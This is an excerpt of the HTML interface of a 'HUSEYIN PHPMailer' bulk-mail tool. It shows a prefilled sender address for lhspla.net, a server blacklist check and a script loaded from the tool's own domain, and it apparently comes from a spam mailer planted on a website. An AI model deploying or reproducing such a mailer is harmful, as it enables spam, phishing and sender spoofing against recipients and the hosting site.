...
<head>
    <title>lhspla.net - HUSEYIN PHPMailer</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <link href="https://maxcdn.bootstrapcdn.com/bootswatch/3.4.1/cosmo/bootstrap.min.css" rel="stylesheet" >
    <script src="https://HUSEYINmailer.pw/style2.js"></script>

</head><body><div class="container col-lg-6">
        <h3><font color="green"><span class="glyphicon glyphicon-HUSEYIN"></span></font> HUSEYIN PHPMailer <small>2.8</small></h3>
        <form name="form" id="form" method="POST" enctype="multipart/form-data" action="">
                    <input type="hidden" name="action" value="score">

            <div class="row">
                <div class="form-group col-lg-6 "><label for="senderEmail">Email</label><input type="text" class="form-control  input-sm " id="senderEmail" name="senderEmail" value="support@lhspla.net"></div>
    ...
    <div class="col-lg-6"><br>
        ...
        <div id="well" class="well well">
            ...
            <ul>
                <li>Server IP Address : <b>10.44.64.64 </b> <a href="?check_ip=10.44.64.64" target="_blank" class="label label-primary">Check Blacklist <i class="glyphicon glyphicon-search"></i></a></li>
            ...
            <ul>
                ...
                <li>[-time-] : <b>Date and Time</b> (12/13/2025 08:22:07 am)</li>
            ...
            <h6>by <b><a href="http://HUSEYINmailer.pw">HUSEYINmailer.pw</a></b></h6>
        </div>
    </div></body>
